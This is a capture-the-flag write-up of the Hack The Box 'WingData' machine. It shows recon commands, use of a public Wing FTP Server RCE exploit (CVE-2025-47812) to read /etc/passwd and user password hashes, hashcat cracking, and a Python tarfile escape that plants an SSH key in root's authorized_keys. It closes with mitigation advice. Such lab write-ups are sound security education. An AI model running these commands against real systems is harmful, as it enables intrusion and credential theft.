# WingData

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | WingData |
| Difficulty | Easy |
| Operating System | Linux (Debian 12 — `linux 6.1.0-42-amd64`) |
| IP Address | 10.129.4.47 |

---

## Summary

> WingData is an Easy Linux machine from HackTheBox Season 10. The attack surface begins with subdomain enumeration that exposes a **Wing FTP Server 7.4.3** instance, which is vulnerable to unauthenticated RCE via Lua injection (CVE-2025-47812). This allows arbitrary command execution as the `wingftp` user, enabling extraction and cracking of a SHA-256 password hash for the user `wacky`. Password reuse grants SSH access. Local enumeration reveals a `sudo` rule allowing `wacky` to execute a Python backup restore script as root. Python 3.12.3 is vulnerable to a `tarfile` PATH_MAX filter bypass (CVE-2025-4138 / CVE-2025-4517), which is leveraged to inject an SSH public key into `/root/.ssh/authorized_keys`, achieving root access.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Initial quick scan
nmap 10.129.4.47

# Full port scan to catch non-standard ports
sudo nmap -sS -p- --min-rate 10000 -T5 10.129.4.47 -oG ports.txt

# Detailed service/version/script scan
nmap -A -sC -sV -p22,80 10.129.4.47 -oN nmap/initial.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Open Ports

| Port | Protocol | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 9.2p1 Debian 2+deb12u7 |
| 80 | TCP | HTTP | Apache httpd 2.4.66 — redirects to `wingdata.htb` |

### Notes

> Only two ports visible on default scan. Port 80 immediately redirects to `wingdata.htb` — add to `/etc/hosts`. With a minimal attack surface, virtual host / subdomain enumeration is the logical next step. No non-standard ports discovered on this target.

---

## 2. Enumeration

### Web Enumeration

```bash
# Add virtual host to /etc/hosts
echo "10.129.4.47    wingdata.htb" | sudo tee -a /etc/hosts

# Subdomain enumeration via virtual host fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt \
     -u http://wingdata.htb \
     -H "Host: FUZZ.wingdata.htb" \
     -t 1000 -c -fw 21
```

> `ffuf` discovers the subdomain `ftp.wingdata.htb`. Add to `/etc/hosts`:

```bash
echo "10.129.4.47    ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

> Navigating to `http://wingdata.htb/` shows the main WingData Solutions site. The "Client Portal" button in the top-right redirects to `ftp.wingdata.htb`.

---

### Other Services

> **Wing FTP Server (ftp.wingdata.htb)** — The response header and page footer reveal:

```bash
curl http://ftp.wingdata.htb -i
# Server: Wing FTP Server(Free Edition)
# Page footer: "FTP server software powered by Wing FTP Server v7.4.3"
```

> The subdomain serves a **Wing FTP Server v7.4.3** web interface — a login page with no guest or default credentials visible. Version identification leads directly to a critical public exploit.

```bash
# Check for known exploits
searchsploit wing 7.4.3
# Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution | multiple/remote/52347.py

# Also available in Metasploit:
# exploit/multi/http/wingftp_null_byte_rce  (CVE-2025-47812)
```

---

## 3. Foothold

### Vulnerability Identified

> **CVE-2025-47812 — Wing FTP Server 7.4.3 Unauthenticated RCE via Lua Injection**  
> The `loginok.html` endpoint processes the `username` POST parameter through a Lua scripting engine without sanitizing null bytes or newlines. By injecting a null byte (`%00`) followed by Lua code (`io.popen(...)`) into the username field, an attacker can execute arbitrary OS commands without authentication. The session UID returned in the `Set-Cookie` header can then be used to retrieve the command output via `dir.html`.

### Exploitation

```bash
# Clone or download the PoC
# ExploitDB: https://www.exploit-db.com/exploits/52347
# Usage: python3 exploit.py -u <target> -c "<command>" -v

# Verify RCE — read /etc/passwd
python3 exploit.py -u http://ftp.wingdata.htb -c "cat /etc/passwd" -v
# Reveals users: wingftp (uid 1000), wacky (uid 1001)

# Enumerate Wing FTP configuration files
python3 exploit.py -u http://ftp.wingdata.htb \
    -c "find /opt/wftpserver -name '*.xml'" -v
# Reveals:
# /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
# /opt/wftpserver/Data/1/users/wacky.xml
# /opt/wftpserver/Data/1/users/maria.xml
# /opt/wftpserver/Data/1/users/john.xml
# /opt/wftpserver/Data/1/users/steve.xml
# /opt/wftpserver/Data/1/users/anonymous.xml

# Extract wacky's password hash
python3 exploit.py -u http://ftp.wingdata.htb \
    -c "cat /opt/wftpserver/Data/1/users/wacky.xml" -v
# <UserName>wacky</UserName>
# <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

> Wing FTP stores passwords as `sha256($salt.$pass)` where the salt is the fixed string `WingFTP`. Crack using hashcat mode 1410 (`sha256($salt.$pass)`):

```bash
# Build hash file (format: hash:salt)
cat > hashes.txt << EOF
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
EOF

# Crack with hashcat
hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt

# Result:
# 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

> Credentials recovered: `wacky : !#7Blushing^*Bride5`

### Shell Obtained

> Password reuse — credentials work for SSH login:

```bash
ssh wacky@10.129.4.47
# Password: !#7Blushing^*Bride5
```

> Shell obtained as `wacky`. User flag located at `/home/wacky/user.txt`.

---

## 4. Lateral Movement

> Not applicable. The recovered credentials directly authenticate as `wacky` over SSH. No intermediate pivoting between users is required.

---

## 5. Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

```bash
# Check Python version
/usr/local/bin/python3 --version
# Python 3.12.3
```

> The script `/opt/backup_clients/restore_backup_clients.py` accepts a tar archive (`-b`) and an extraction directory (`-r`) as arguments, and uses Python's `tarfile` module to extract the archive **as root**. Python 3.12.3 is vulnerable to **CVE-2025-4138 / CVE-2025-4517**, a `tarfile` PATH_MAX filter bypass that allows a maliciously crafted tar archive to escape the target extraction directory and write files to arbitrary paths on the filesystem.

### Exploitation

```bash
# Step 1 — Generate a new SSH key pair on the target
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""
# Saves private key to ~/.ssh/wingdata_key
# Saves public key to ~/.ssh/wingdata_key.pub

# Step 2 — Build the malicious tar archive using CVE-2025-4138 exploit
# The exploit chains PATH_MAX-overflowing symlinks to escape the extraction root
# and write the payload to an arbitrary absolute path
python3 exploit_tarfile.py \
    --preset ssh-key \
    --payload ~/.ssh/wingdata_key.pub \
    --tar-out backup_888.tar
# [+] Exploit tar: backup_888.tar
# [+] Target: /root/.ssh/authorized_keys
# [+] Payload size: 96 bytes

# Step 3 — Place the malicious archive in the backups directory
mv backup_888.tar /opt/backup_clients/backups/

# Step 4 — Trigger extraction as root via the sudo rule
sudo /usr/local/bin/python3 \
    /opt/backup_clients/restore_backup_clients.py \
    -b backup_888.tar \
    -r restore_win123
# [+] Backup: backup_888.tar
# [+] Staging directory: /opt/backup_clients/restored_backups/restore_win123
# [+] Extraction completed in /opt/backup_clients/restored_backups/restore_win123

# Step 5 — SSH to root using the injected key
ssh -i ~/.ssh/wingdata_key root@127.0.0.1
```

> The tar archive contains a chain of symlinks that overflow PATH_MAX, causing the `tarfile` filter to lose track of the real filesystem path. The final payload entry resolves to `/root/.ssh/authorized_keys`, writing the attacker's public key with mode `0600` under the root user context.

### Root / Administrator Access

```bash
root@wingdata:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

root@wingdata:~# cat /root/root.txt
<root flag here>
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | (retrieve via `cat /home/wacky/user.txt`) |
| Root | (retrieve via `cat /root/root.txt`) |

---

## 7. Lessons Learned

> - **Subdomain/vhost enumeration is essential** — the entire attack surface was hidden behind `ftp.wingdata.htb`. A default scan shows nothing exploitable; VHost fuzzing with `ffuf` unlocks the foothold.
> - **Version disclosure is critical** — Wing FTP Server displaying its version in the page footer directly mapped to a public unauthenticated RCE exploit. Never expose software version strings in production.
> - **Proprietary password hashing schemes can be weak** — Wing FTP uses a fixed salt (`WingFTP`) for all password hashes. Fixed salts defeat the purpose of salting and make bulk cracking trivial.
> - **Password reuse across services** — `wacky`'s FTP password worked on SSH. Credential reuse remains one of the most reliable lateral movement techniques.
> - **`sudo` on backup/restore scripts is a common privesc vector** — scripts that process external archives or files as root require extreme care. The `restore_backup_clients.py` case is a textbook example of a dangerous sudo rule.
> - **CVE-2025-4138 / CVE-2025-4517** show that even standard library modules in widely used languages can have critical vulnerabilities. Python's `tarfile` extraction should always be hardened with strict path validation and extraction filters.
> - **Always run a full `-p-` port scan** — while this machine had no hidden ports, the habit is critical. WingData's attack path required VHost enumeration instead.

---

## 8. Mitigation & Hardening

> - **CVE-2025-47812 (Wing FTP RCE)**: Upgrade Wing FTP Server to a patched version (≥ 7.4.4). Sanitize and reject null bytes and newline characters in all user-supplied input processed by the Lua scripting engine. Restrict the web admin interface to trusted IP ranges and require authentication for all endpoints.
> - **Wing FTP password hashing**: Replace the fixed-salt SHA-256 scheme with a modern, properly salted algorithm such as bcrypt or Argon2. Rotate all existing credentials immediately.
> - **Password reuse**: Enforce distinct credentials per service and per system. Implement password managers and policies that prohibit reuse. Enable key-based SSH authentication only and disable password auth.
> - **Dangerous sudo rules**: Remove NOPASSWD sudo access for scripts that process external input (archives, files). If backup restore functionality is required at elevated privileges, implement it as a locked-down, read-only daemon rather than a sudo-accessible script.
> - **CVE-2025-4138 / CVE-2025-4517 (Python tarfile)**: Upgrade Python to a patched version (≥ 3.12.9 / 3.13.3). Always use `tarfile.data_filter` when extracting archives in security-sensitive contexts. Validate all extracted paths against the intended destination directory before writing, and reject archives containing symlinks that resolve outside the extraction root.
> - **Software version disclosure**: Remove or obscure version strings from HTTP headers and web page footers. Attackers routinely map disclosed versions to public CVEs in seconds.

---

## References

- [CVE-2025-47812 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-47812)
- [Wing FTP Server 7.4.3 RCE — ExploitDB 52347](https://www.exploit-db.com/exploits/52347)
- [Metasploit Module — wingftp_null_byte_rce](https://www.rapid7.com/db/modules/exploit/multi/http/wingftp_null_byte_rce/)
- [CVE-2025-4138 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-4138)
- [CVE-2025-4517 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)
- [Python tarfile extraction filters — Python Docs](https://docs.python.org/3/library/tarfile.html#tarfile-extraction-filter)
- [Hashcat mode 1410 — sha256($salt.$pass)](https://hashcat.net/wiki/doku.php?id=hashcat)
- [SecLists — DNS subdomain wordlists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)
